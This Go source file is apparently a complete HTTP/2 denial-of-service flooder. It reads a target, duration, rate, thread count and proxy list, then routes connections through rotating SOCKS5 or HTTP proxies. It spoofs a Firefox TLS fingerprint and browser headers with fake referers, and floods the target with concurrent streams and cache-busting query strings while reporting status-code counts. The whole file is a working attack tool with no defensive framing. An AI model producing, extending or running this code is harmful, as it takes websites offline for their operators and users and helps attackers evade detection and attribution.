//dunglee hello
package main

import (
	"bufio"
	"bytes"
	"context"
	"encoding/binary"
	"errors"
	"fmt"
	"io"
	"math/rand"
	"net"
	"net/url"
	"os"
	"runtime"
	"strconv"
	"strings"
	"sync"
	"sync/atomic"
	"syscall"
	"time"

	"github.com/bogdanfinn/tls-client/profiles"
	tls "github.com/bogdanfinn/utls"
	hpack "golang.org/x/net/http2/hpack"
)

var (
	target    string
	proxyFile string
	threads   int64
	duration  int64
	rate      int64

	pathFlag   bool
	httpFlag   bool
	pseudoFlag bool
	rawFlag    bool
)

var (
	targetURL *url.URL
	proxies   []string

	activeConn  int32
	reqCount    int64
	stat2xx     int64
	stat3xx     int64
	stat4xx     int64
	stat5xx     int64
	seedCounter int64

	errStreamLimit = errors.New("stream limit")
	errConnDone    = errors.New("conn done")
)

var userAgents = []string{
	"Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:147.0) Gecko/20100101 Firefox/147.0",
	"Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:147.0) Gecko/20100101 Firefox/147.0",
	"Mozilla/5.0 (X11; Linux x86_64; rv:147.0) Gecko/20100101 Firefox/147.0",
	"Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:147.0) Gecko/20100101 Firefox/147.0",
}

var languages = []string{
	"en-US,en;q=0.9",
	"en-US,en;q=0.9",
	"en-GB,en;q=0.9",
}

var crossSiteReferers = []string{
	"https://www.google.com/",
	"https://www.google.com/",
	"https://www.google.com/",
	"https://chatgpt.com/",
	"https://news.google.com/",
	"https://www.reddit.com/",
	"https://l.threads.com/",
	"https://t.co/",
	"https://medium.com/",
	"https://github.com",
	"https://www.quora.com/",
	"https://www.reddit.com/",
	"https://www.linkedin.com/",
	"https://www.youtube.com/",
}

var siteNames = [2]string{"none", "cross-site"}

var siteDistrib = [10]byte{0, 0, 0, 0, 1, 1, 1, 1, 1, 1}
var priorityData = [5]byte{0x00, 0x00, 0x00, 0x00, 0x28}

type pathTmplEntry struct {
	path   string
	hblock []byte
}

var pathTmpls [2][2][256]pathTmplEntry

var fullCache [2][2][256][]byte

var hblockBufPool = sync.Pool{
	New: func() interface{} {
		return &bytes.Buffer{}
	},
}

var framePool = sync.Pool{
	New: func() interface{} {
		b := make([]byte, 0, 0x4000)
		return &b
	},
}

type writeFrame struct {
	ftype    byte
	flags    byte
	_pad2    [2]byte
	streamID uint32
	payload  []byte
	paylen   int64
}

type h2Conn struct {
	conn         net.Conn
	bw           *bufio.Writer
	writeCh      chan writeFrame
	activeStreams int32
	_pad4        [4]byte
	doneCh       chan struct{}
	closeOnce    sync.Once
	dec          *hpack.Decoder
	maxStreams   uint32
	streamSent   uint32
}

func (c *h2Conn) writeFrameDirect(ftype, flags byte, streamID uint32, payload []byte, paylen int64) error {
	hdr := [9]byte{
		byte(paylen >> 16),
		byte(paylen >> 8),
		byte(paylen),
		ftype,
		flags,
		byte(streamID >> 24),
		byte(streamID >> 16),
		byte(streamID >> 8),
		byte(streamID),
	}
	if _, err := c.bw.Write(hdr[:]); err != nil {
		return err
	}
	if paylen > 0 {
		if _, err := c.bw.Write(payload[:paylen]); err != nil {
			return err
		}
	}
	return nil
}

func newH2Conn(conn net.Conn) (*h2Conn, error) {
	bw := bufio.NewWriterSize(conn, 0x8000)
	writeCh := make(chan writeFrame, 0x200)
	doneCh := make(chan struct{})
	dec := hpack.NewDecoder(0x10000, nil)

	c := &h2Conn{
		conn:          conn,
		bw:            bw,
		writeCh:       writeCh,
		doneCh:        doneCh,
		dec:           dec,
		maxStreams:    0x3e8,
		activeStreams: -1,
	}

	settingsBuf := [24]byte{
		0x00, 0x01, 0x00, 0x01, 0x00, 0x00,
		0x00, 0x02, 0x00, 0x00, 0x00, 0x00,
		0x00, 0x04, 0x00, 0x02, 0x00, 0x00,
		0x00, 0x05, 0x00, 0x40, 0x00, 0x00,
	}

	windowBuf := [4]byte{0x00, 0xbf, 0x00, 0x01}

	if _, err := bw.WriteString("PRI * HTTP/2.0\r\n\r\nSM\r\n\r\n"); err != nil {
		return nil, err
	}
	if err := c.writeFrameDirect(0x4, 0, 0, settingsBuf[:], int64(len(settingsBuf))); err != nil {
		return nil, err
	}
	if err := c.writeFrameDirect(0x8, 0, 0, windowBuf[:], int64(len(windowBuf))); err != nil {
		return nil, err
	}
	if err := bw.Flush(); err != nil {
		return nil, err
	}

	go c.writer()
	go c.reader()
	return c, nil
}

func (c *h2Conn) close() {
	c.closeOnce.Do(func() {
		c.conn.Close()
		close(c.doneCh)
	})
}

func (c *h2Conn) writer() {
	defer c.close()
	for {
		select {
		case frame := <-c.writeCh:
			_ = c.writeFrameDirect(frame.ftype, frame.flags, frame.streamID, frame.payload, frame.paylen)
			select {
			case frame2 := <-c.writeCh:
				if err := c.writeFrameDirect(frame2.ftype, frame2.flags, frame2.streamID, frame2.payload, frame2.paylen); err != nil {
					return
				}
			default:
			}
			if err := c.bw.Flush(); err != nil {
				return
			}
		case <-c.doneCh:
			return
		}
	}
}

func (c *h2Conn) reader() {
	defer c.close()
	br := bufio.NewReaderSize(c.conn, 0x8000)
	_ = c.conn.SetDeadline(time.Now().Add(30 * time.Second))

	hdr := make([]byte, 9)
	for {
		if _, err := io.ReadAtLeast(br, hdr, 9); err != nil {
			return
		}
		length := int(hdr[0])<<16 | int(hdr[1])<<8 | int(hdr[2])
		ftype := hdr[3]
		flags := hdr[4]
		streamID := binary.BigEndian.Uint32(hdr[5:]) & 0x7fffffff

		var payload []byte
		var poolBuf *[]byte
		if length > 0 {
			pb := framePool.Get().(*[]byte)
			if cap(*pb) < length {
				b := make([]byte, length)
				pb = &b
			}
			*pb = (*pb)[:length]
			if _, err := io.ReadAtLeast(br, *pb, length); err != nil {
				framePool.Put(pb)
				return
			}
			payload = *pb
			poolBuf = pb
		}

		switch ftype {
		case 0x0:
			if length > 0 {
				wu := make([]byte, 8)
				inc := uint32(length)
				binary.BigEndian.PutUint32(wu[:4], inc)
				binary.BigEndian.PutUint32(wu[4:], inc)
				frame := writeFrame{ftype: 0x8, streamID: streamID, payload: wu[:4], paylen: 4}
				select {
				case c.writeCh <- frame:
				case <-c.doneCh:
				}
				frame2 := writeFrame{ftype: 0x8, streamID: 0, payload: wu[4:], paylen: 4}
				select {
				case c.writeCh <- frame2:
				case <-c.doneCh:
				}
			}
		case 0x1:
			c.handleHeaders(flags, payload, length, streamID)
		case 0x3:
			atomic.AddUint32(&c.streamSent, ^uint32(0))
		case 0x4:
			c.handleSettings(flags&1 != 0, payload, length, streamID)
		case 0x6:
			if flags&1 == 0 {
				pong := make([]byte, 8)
				if len(payload) >= 8 {
					copy(pong, payload[:8])
				}
				frame := writeFrame{ftype: 0x6, flags: 0x1, payload: pong, paylen: 8}
				select {
				case c.writeCh <- frame:
				case <-c.doneCh:
				}
			}
		case 0x7:
			if poolBuf != nil {
				framePool.Put(poolBuf)
			}
			return
		}

		if poolBuf != nil {
			framePool.Put(poolBuf)
			poolBuf = nil
		}
	}
}

func (c *h2Conn) handleSettings(ack bool, payload []byte, length int, streamID uint32) {
	if ack {
		return
	}
	for i := 0; i+6 <= length; i += 6 {
		id := binary.BigEndian.Uint16(payload[i:])
		val := binary.BigEndian.Uint32(payload[i+2:])
		if id == 3 {
			atomic.StoreUint32(&c.maxStreams, val)
		}
	}
	frame := writeFrame{ftype: 0x4, flags: 0x1, paylen: 0}
	select {
	case c.writeCh <- frame:
	case <-c.doneCh:
	}
}

func (c *h2Conn) handleHeaders(flags byte, payload []byte, length int, streamID uint32) {
	atomic.AddUint32(&c.streamSent, ^uint32(0))

	padOffset := 0
	if flags&0x08 != 0 && len(payload) > 0 {
		padLen := int(payload[0])
		if padLen >= len(payload) {
			return
		}
		payload = payload[1 : len(payload)-padLen]
		padOffset = 1
	}
	if flags&0x20 != 0 && len(payload) >= 5 {
		payload = payload[5:]
		padOffset += 5
	}
	_ = padOffset

	if len(payload) == 0 {
		return
	}

	if payload[0] == 0x88 {
		c.dec.SetEmitEnabled(false)
		_, _ = c.dec.Write(payload)
		atomic.AddInt64(&stat2xx, 1)
		return
	}
	if payload[0] == 0x8d {
		c.dec.SetEmitEnabled(false)
		_, _ = c.dec.Write(payload)
		atomic.AddInt64(&stat4xx, 1)
		return
	}

	var status int
	c.dec.SetEmitEnabled(true)
	c.dec.SetEmitFunc(func(f hpack.HeaderField) {
		if f.Name == ":status" {
			n, err := strconv.Atoi(f.Value)
			if err == nil {
				status = n
			}
			c.dec.SetEmitEnabled(false)
		}
	})
	_, _ = c.dec.Write(payload)

	if status == 0 {
		return
	}
	switch {
	case status >= 200 && status < 300:
		atomic.AddInt64(&stat2xx, 1)
	case status >= 300 && status < 400:
		atomic.AddInt64(&stat3xx, 1)
	case status >= 400 && status < 500:
		atomic.AddInt64(&stat4xx, 1)
	case status >= 500:
		atomic.AddInt64(&stat5xx, 1)
	}
}

func (c *h2Conn) sendRequest(hblock []byte) error {
	prev := uint32(atomic.AddInt32(&c.activeStreams, 2) - 2)
	if prev >= 0x7fffff00 {
		c.close()
		return errConnDone
	}

	for {
		sent := atomic.LoadUint32(&c.streamSent)
		max := atomic.LoadUint32(&c.maxStreams)
		if max <= sent {
			return errStreamLimit
		}
		if atomic.CompareAndSwapUint32(&c.streamSent, sent, sent+1) {
			break
		}
	}

	streamID := prev + 2

	frame := writeFrame{
		ftype:    0x1,
		flags:    0x25,
		streamID: streamID,
		payload:  hblock,
		paylen:   int64(len(hblock)),
	}
	select {
	case c.writeCh <- frame:
		return nil
	case <-c.doneCh:
		atomic.AddUint32(&c.streamSent, ^uint32(0))
		return errConnDone
	}
}

func buildHblock(rng *rand.Rand, siteName string, host string, referer string, rawFlagVal bool) []byte {
	buf := hblockBufPool.Get().(*bytes.Buffer)
	buf.Reset()
	defer hblockBufPool.Put(buf)

	enc := hpack.NewEncoder(buf)

	uaIdx := rng.Intn(len(userAgents))
	ua := userAgents[uaIdx]

	langIdx := rng.Intn(len(languages))
	lang := languages[langIdx]

	fields8 := []hpack.HeaderField{
		{Name: ":method", Value: "GET"},
		{Name: ":path", Value: "/"},
		{Name: ":authority", Value: host},
		{Name: ":scheme", Value: "https"},
		{Name: "user-agent", Value: ua},
		{Name: "accept", Value: "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8"},
		{Name: "accept-language", Value: lang},
		{Name: "accept-encoding", Value: "gzip, deflate, br, zstd"},
	}
	for _, f := range fields8 {
		_ = enc.WriteField(f)
	}

	if referer != "" {
		_ = enc.WriteField(hpack.HeaderField{Name: "referer", Value: referer})
	}

	fields4 := []hpack.HeaderField{
		{Name: "upgrade-insecure-requests", Value: "1"},
		{Name: "sec-fetch-dest", Value: "document"},
		{Name: "sec-fetch-mode", Value: "navigate"},
		{Name: "sec-fetch-site", Value: siteName},
	}
	for _, f := range fields4 {
		_ = enc.WriteField(f)
	}

	if rawFlagVal {
		_ = enc.WriteField(hpack.HeaderField{Name: "sec-fetch-user", Value: "?1"})
	}

	fields2 := []hpack.HeaderField{
		{Name: "priority", Value: "u=0, i"},
		{Name: "te", Value: "trailers"},
	}
	for _, f := range fields2 {
		_ = enc.WriteField(f)
	}

	hpackBytes := buf.Bytes()
	out := make([]byte, 5+len(hpackBytes))
	copy(out[:5], priorityData[:])
	copy(out[5:], hpackBytes)
	return out
}

func buildPseudoHblock(rng *rand.Rand) []byte {
	buf := hblockBufPool.Get().(*bytes.Buffer)
	buf.Reset()
	defer hblockBufPool.Put(buf)

	enc := hpack.NewEncoder(buf)

	fields := []hpack.HeaderField{
		{Name: ":method", Value: "GET"},
		{Name: ":path", Value: "/"},
		{Name: ":scheme", Value: "https"},
		{Name: ":authority", Value: targetURL.Host},
	}
	for _, f := range fields {
		_ = enc.WriteField(f)
	}

	hpackBytes := buf.Bytes()
	out := make([]byte, 5+len(hpackBytes))
	copy(out[:5], priorityData[:])
	copy(out[5:], hpackBytes)
	return out
}

func buildHblockTemplate(rng *rand.Rand, host string, referer string, rawFlagVal bool, siteName string) []byte {
	buf1 := new(bytes.Buffer)
	enc1 := hpack.NewEncoder(buf1)
	_ = enc1.WriteField(hpack.HeaderField{Name: ":method", Value: "GET"})

	buf2 := new(bytes.Buffer)
	enc2 := hpack.NewEncoder(buf2)

	uaIdx := rng.Intn(len(userAgents))
	ua := userAgents[uaIdx]

	langIdx := rng.Intn(len(languages))
	lang := languages[langIdx]

	fields6 := []hpack.HeaderField{
		{Name: ":path", Value: "/"},
		{Name: ":authority", Value: host},
		{Name: ":scheme", Value: "https"},
		{Name: "user-agent", Value: ua},
		{Name: "accept", Value: "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8"},
		{Name: "accept-language", Value: lang},
	}
	for _, f := range fields6 {
		_ = enc2.WriteField(f)
	}

	if referer != "" {
		_ = enc2.WriteField(hpack.HeaderField{Name: "referer", Value: referer})
	}

	fields4 := []hpack.HeaderField{
		{Name: "upgrade-insecure-requests", Value: "1"},
		{Name: "sec-fetch-dest", Value: "document"},
		{Name: "sec-fetch-mode", Value: "navigate"},
		{Name: "sec-fetch-site", Value: siteName},
	}
	for _, f := range fields4 {
		_ = enc2.WriteField(f)
	}

	if rawFlagVal {
		_ = enc2.WriteField(hpack.HeaderField{Name: "sec-fetch-user", Value: "?1"})
	}

	fields2 := []hpack.HeaderField{
		{Name: "priority", Value: "u=0, i"},
		{Name: "te", Value: "trailers"},
	}
	for _, f := range fields2 {
		_ = enc2.WriteField(f)
	}

	b1 := buf1.Bytes()
	b2 := buf2.Bytes()
	out := make([]byte, 5+len(b1)+len(b2))
	copy(out[:5], priorityData[:])
	copy(out[5:], b1)
	copy(out[5+len(b1):], b2)
	return out
}

func makePathHblock(rng *rand.Rand, tmpl *pathTmplEntry) []byte {
	src := []byte(tmpl.path)
	buf := make([]byte, len(src), len(src)+20)
	copy(buf, src)

	for i := 0; i < 6; i++ {
		v := rng.Int63()
		d := v % 10
		buf = append(buf, byte('0'+d))
	}

	n := rng.Int63n(0xdbb9f) + 0x186a0
	buf = strconv.AppendInt(buf, n, 10)

	return buf
}

func pickHblock(rng *rand.Rand) []byte {
	if pseudoFlag {
		return buildPseudoHblock(rng)
	}

	v1 := rng.Int63()
	siteIdx := v1 % 10
	site := int(siteDistrib[siteIdx])

	_ = rng.Int63()

	if pathFlag {
		v3 := rng.Int63()
		pathIdx := int(v3 % 10)
		httpIdx := 1
		if pathIdx >= 9 && site == 1 {
			httpIdx = 0
		}
		if site >= 2 {
			return buildPseudoHblock(rng)
		}
		return makePathHblock(rng, &pathTmpls[site][httpIdx][pathIdx])
	}

	v3 := rng.Int63()
	refIdx := int(v3 % 10)

	if site >= 2 {
		return buildPseudoHblock(rng)
	}

	h := 1
	if refIdx >= 8 {
		h = 0
	}
	cached := fullCache[site][h][0]
	if cached != nil {
		return cached
	}
	return buildPseudoHblock(rng)
}

func runFlooder(ctx context.Context, proxyAddr string) {
	atomic.AddInt32(&activeConn, 1)
	defer atomic.AddInt32(&activeConn, -1)

	rawConn, err := dialProxy(proxyAddr, targetURL.Host)
	if err != nil {
		return
	}

	tlsConn := tls.UClient(rawConn, &tls.Config{
		ServerName:         targetURL.Hostname(),
		InsecureSkipVerify: true,
	}, profiles.Firefox_147.GetClientHelloSpec())
	_ = tlsConn.SetDeadline(time.Now().Add(5 * time.Second))

	if err := tlsConn.HandshakeContext(ctx); err != nil {
		rawConn.Close()
		return
	}

	cs := tlsConn.ConnectionState()
	if cs.NegotiatedProtocol != "h2" {
		tlsConn.Close()
		return
	}

	c, err := newH2Conn(tlsConn)
	if err != nil {
		tlsConn.Close()
		return
	}
	defer c.close()

	var wg sync.WaitGroup
	for i := int64(0); i < rate; i++ {
		sc := atomic.AddInt64(&seedCounter, 1)
		rng := rand.New(rand.NewSource(sc))

		wg.Add(1)
		go func(rng *rand.Rand, h2c *h2Conn, wg *sync.WaitGroup) {
			defer wg.Done()
			for {
				select {
				case <-ctx.Done():
					return
				default:
				}
				select {
				case <-h2c.doneCh:
					return
				default:
				}
				if uint32(atomic.LoadInt32(&h2c.activeStreams)) >= 0x7fffff00 {
					return
				}
				hblock := pickHblock(rng)
				err := h2c.sendRequest(hblock)
				if errors.Is(err, errStreamLimit) {
					runtime.Gosched()
					continue
				}
				if err != nil {
					return
				}
				atomic.AddInt64(&reqCount, 1)
			}
		}(rng, c, &wg)
	}
	wg.Wait()
}

func startFlooders(ctx context.Context) {
	for i := int64(0); i < threads; i++ {
		go func(ctx context.Context) {
			for {
				select {
				case <-ctx.Done():
					return
				default:
					proxy := proxies[rand.Intn(len(proxies))]
					runFlooder(ctx, proxy)
				}
			}
		}(ctx)
	}
}

func setKeepAlive(conn net.Conn) {
	tc, ok := conn.(*net.TCPConn)
	if !ok {
		return
	}
	_ = tc.SetKeepAlive(true)
	_ = tc.SetKeepAlivePeriod(6 * time.Second)
}

func dialDirect(host string) (net.Conn, error) {
	if !strings.Contains(host, ":") {
		host += ":443"
	}
	d := net.Dialer{Timeout: 10 * time.Second}
	conn, err := d.Dial("tcp", host)
	if err != nil {
		return nil, err
	}
	setKeepAlive(conn)
	return conn, nil
}

type socks5Auth struct {
	user string
	pass string
}

func parseSocks5Proxy(raw string) (host string, auth *socks5Auth, err error) {
	u, err := url.Parse(raw)
	if err != nil {
		return "", nil, fmt.Errorf("invalid proxy: %s", raw)
	}
	host = u.Host
	if u.User != nil {
		a := &socks5Auth{user: u.User.Username()}
		a.pass, _ = u.User.Password()
		auth = a
	}
	return
}

func dialProxySocks5(proxyAddr, targetHost string) (net.Conn, error) {
	host, auth, err := parseSocks5Proxy(proxyAddr)
	if err != nil {
		return nil, err
	}
	if !strings.Contains(host, ":") {
		host += ":1080"
	}
	conn, err := net.DialTimeout("tcp", host, 10*time.Second)
	if err != nil {
		return nil, err
	}
	if err := socks5Handshake(conn, targetHost, auth); err != nil {
		conn.Close()
		return nil, err
	}
	return conn, nil
}

func socks5Handshake(conn net.Conn, targetHost string, auth *socks5Auth) error {
	_ = conn.SetDeadline(time.Now().Add(10 * time.Second))
	defer conn.SetDeadline(time.Time{})

	if auth != nil {
		if _, err := conn.Write([]byte{0x05, 0x02, 0x00, 0x02}); err != nil {
			return err
		}
	} else {
		if _, err := conn.Write([]byte{0x05, 0x01, 0x00}); err != nil {
			return err
		}
	}
	resp := make([]byte, 2)
	if _, err := io.ReadFull(conn, resp); err != nil {
		return err
	}
	if resp[0] != 0x05 {
		return fmt.Errorf("socks5: bad response version")
	}
	if resp[1] == 0x02 && auth != nil {
		req := []byte{0x01}
		req = append(req, byte(len(auth.user)))
		req = append(req, auth.user...)
		req = append(req, byte(len(auth.pass)))
		req = append(req, auth.pass...)
		if _, err := conn.Write(req); err != nil {
			return err
		}
		authResp := make([]byte, 2)
		if _, err := io.ReadFull(conn, authResp); err != nil {
			return err
		}
		if authResp[1] != 0x00 {
			return fmt.Errorf("socks5: auth failed")
		}
	}

	host, portStr, err := net.SplitHostPort(targetHost)
	if err != nil {
		host = targetHost
		portStr = "443"
	}
	port := 443
	fmt.Sscanf(portStr, "%d", &port)
	if port <= 0 || port > 65535 {
		return fmt.Errorf("socks5: bad port %s", portStr)
	}

	req := []byte{0x05, 0x01, 0x00, 0x03}
	req = append(req, byte(len(host)))
	req = append(req, host...)
	req = append(req, byte(port>>8), byte(port))
	if _, err := conn.Write(req); err != nil {
		return err
	}

	resp2 := make([]byte, 10)
	if _, err := io.ReadFull(conn, resp2[:4]); err != nil {
		return err
	}
	if resp2[1] != 0x00 {
		return fmt.Errorf("socks5: connect failed: %d", resp2[1])
	}
	switch resp2[3] {
	case 0x01:
		if _, err := io.ReadFull(conn, resp2[:6]); err != nil {
			return err
		}
	case 0x04:
		buf := make([]byte, 18)
		if _, err := io.ReadFull(conn, buf); err != nil {
			return err
		}
	case 0x03:
		lenBuf := make([]byte, 1)
		if _, err := io.ReadFull(conn, lenBuf); err != nil {
			return err
		}
		buf := make([]byte, int(lenBuf[0])+2)
		if _, err := io.ReadFull(conn, buf); err != nil {
			return err
		}
	}
	return nil
}

func dialProxyHTTP(proxyAddr, targetHost string) (net.Conn, error) {
	if !strings.Contains(proxyAddr, "://") {
		proxyAddr = "http://" + proxyAddr
	}
	u, err := url.Parse(proxyAddr)
	if err != nil {
		return nil, fmt.Errorf("invalid proxy format: %s", proxyAddr)
	}
	conn, err := net.DialTimeout("tcp", u.Host, 10*time.Second)
	if err != nil {
		return nil, err
	}
	req := fmt.Sprintf("CONNECT %s HTTP/1.1\r\nHost: %s\r\n", targetHost, targetHost)
	if u.User != nil {
		req += "Proxy-Authorization: Basic ...\r\n"
	}
	req += "\r\n"
	if _, err := conn.Write([]byte(req)); err != nil {
		conn.Close()
		return nil, err
	}
	resp := make([]byte, 256)
	n, err := conn.Read(resp)
	if err != nil {
		conn.Close()
		return nil, err
	}
	if !strings.Contains(string(resp[:n]), "200") {
		conn.Close()
		return nil, fmt.Errorf("proxy CONNECT failed: %s", strings.TrimSpace(string(resp[:n])))
	}
	return conn, nil
}

func dialProxy(proxyAddr, targetHost string) (net.Conn, error) {
	if proxyAddr == "" {
		return dialDirect(targetHost)
	}
	if strings.HasPrefix(proxyAddr, "socks5://") || strings.HasPrefix(proxyAddr, "socks5h://") {
		return dialProxySocks5(proxyAddr, targetHost)
	}
	return dialProxyHTTP(proxyAddr, targetHost)
}

func runStatsTicker(ctx context.Context, _ int64) {
	defer func() { recover() }()
	ticker := time.NewTicker(time.Second)
	defer ticker.Stop()
	start := time.Now()

	var buckets [10]int64
	var tick int64

	for {
		select {
		case <-ctx.Done():
			return
		case <-ticker.C:
			elapsed := time.Since(start).Seconds()
			total := atomic.LoadInt64(&reqCount)

			bucketIdx := tick % 10
			oldVal := atomic.LoadInt64(&buckets[bucketIdx])
			atomic.StoreInt64(&buckets[bucketIdx], total)
			_ = oldVal

			rps := float64(total) / elapsed
			c2 := atomic.LoadInt64(&stat2xx)
			c3 := atomic.LoadInt64(&stat3xx)
			c4 := atomic.LoadInt64(&stat4xx)
			c5 := atomic.LoadInt64(&stat5xx)
			conn := atomic.LoadInt32(&activeConn)
			tick++
			fmt.Fprintf(os.Stdout,
				"\r[%d/%d] RPS: %.0f | Conn: %d | 2xx: %d 3xx: %d 4xx: %d 5xx: %d       ",
				int64(elapsed), duration, rps, conn, c2, c3, c4, c5)
		}
	}
}

func initFullCache() {
	host := targetURL.Host
	for site := 0; site < 2; site++ {
		for h := 0; h < 2; h++ {
			for ref := 0; ref < 0x100; ref++ {
				sc := atomic.AddInt64(&seedCounter, 1)
				rng := rand.New(rand.NewSource(sc))
				referer := ""
				if site == 1 {
					refIdx := rng.Intn(len(crossSiteReferers))
					referer = crossSiteReferers[refIdx]
				}
				rawFlagVal := site == 0
				fullCache[site][h][ref] = buildHblock(rng, siteNames[site], host, referer, rawFlagVal)
			}
		}
	}
}

func initPathTmpls() {
	host := targetURL.Host
	pathSuffix := "?AAAAAA=111111"
	for site := 0; site < 2; site++ {
		for h := 0; h < 2; h++ {
			for j := 0; j < 0x100; j++ {
				sc := atomic.AddInt64(&seedCounter, 1)
				rng := rand.New(rand.NewSource(sc))
				referer := ""
				if site == 1 {
					refIdx := rng.Intn(len(crossSiteReferers))
					referer = crossSiteReferers[refIdx]
				}
				rawFlagVal := site == 0
				hblock := buildHblockTemplate(rng, host, referer, rawFlagVal, siteNames[site])
				pathTmpls[site][h][j] = pathTmplEntry{
					path:   host + pathSuffix,
					hblock: hblock,
				}
			}
		}
	}
}

func parseArgs() error {
	args := os.Args
	if len(args) < 6 {
		return fmt.Errorf("Usage: %s <target> <duration> <rate> <threads> <proxyfile> [--raw] [--http] [--path] [--pseudo]", args[0])
	}

	target = args[1]

	var err error
	duration, err = strconv.ParseInt(args[2], 10, 64)
	if err != nil || duration <= 0 {
		if err == nil {
			err = fmt.Errorf("invalid duration: %s", args[2])
		}
		return err
	}

	rate, err = strconv.ParseInt(args[3], 10, 64)
	if err != nil || rate <= 0 {
		if err == nil {
			err = fmt.Errorf("invalid rate: %s", args[3])
		}
		return err
	}

	threads, err = strconv.ParseInt(args[4], 10, 64)
	if err != nil || threads <= 0 {
		if err == nil {
			err = fmt.Errorf("invalid thread count: %s", args[4])
		}
		return err
	}

	proxyFile = args[5]

	for _, arg := range args[6:] {
		switch arg {
		case "--raw":
			rawFlag = true
		case "--http":
			httpFlag = true
		case "--path":
			pathFlag = true
		case "--pseudo":
			pseudoFlag = true
		}
	}
	return nil
}

func readLines(path string) ([]string, error) {
	f, err := os.Open(path)
	if err != nil {
		return nil, err
	}
	defer f.Close()
	var lines []string
	sc := bufio.NewScanner(f)
	for sc.Scan() {
		line := strings.TrimSpace(sc.Text())
		if line != "" {
			lines = append(lines, line)
		}
	}
	return lines, sc.Err()
}

func printBanner() {
	fmt.Fprintf(os.Stdout, "Target:   %s\n", target)
	fmt.Fprintf(os.Stdout, "Duration: %d sec | Rate: %d req/conn | Threads: %d | Proxies: %d\n",
		duration, rate, threads, int64(len(proxies)))
	proxyType := "socks"
	if httpFlag {
		proxyType = "http"
	}
	fmt.Fprintf(os.Stdout, "Proxy:    %s\n", proxyType)
	fmt.Fprintln(os.Stdout)
}

func printSummary() {
	total := atomic.LoadInt64(&reqCount)
	rps := float64(total) / float64(duration)
	fmt.Fprintf(os.Stdout, "\nRequests: %d | RPS: %.0f\n", total, rps)
	fmt.Fprintf(os.Stdout, "2xx: %d | 3xx: %d | 4xx: %d | 5xx: %d\n",
		atomic.LoadInt64(&stat2xx),
		atomic.LoadInt64(&stat3xx),
		atomic.LoadInt64(&stat4xx),
		atomic.LoadInt64(&stat5xx),
	)
}

func init() {
	var rl syscall.Rlimit
	if err := syscall.Getrlimit(syscall.RLIMIT_NOFILE, &rl); err == nil {
		rl.Cur = rl.Max
		_ = syscall.Setrlimit(syscall.RLIMIT_NOFILE, &rl)
	}
}

func main() {
	if err := parseArgs(); err != nil {
		fmt.Fprintln(os.Stderr, err)
		os.Exit(1)
	}

	var err error
	targetURL, err = url.Parse(target)
	if err != nil || targetURL.Host == "" {
		fmt.Fprintln(os.Stderr, "Invalid target URL:", target)
		os.Exit(1)
	}

	proxies, err = readLines(proxyFile)
	if err != nil || len(proxies) == 0 {
		if err == nil {
			err = fmt.Errorf("proxy file is empty or not found: %s", proxyFile)
		}
		fmt.Fprintln(os.Stderr, err)
		os.Exit(1)
	}

	if !pseudoFlag {
		initFullCache()
	}
	if pathFlag {
		initPathTmpls()
	}

	printBanner()

	ctx, cancel := context.WithTimeout(context.Background(), time.Duration(duration)*time.Second)
	defer cancel()

	startFlooders(ctx)
	go runStatsTicker(ctx, duration)

	<-ctx.Done()
	printSummary()
}

var _ = profiles.Firefox_147
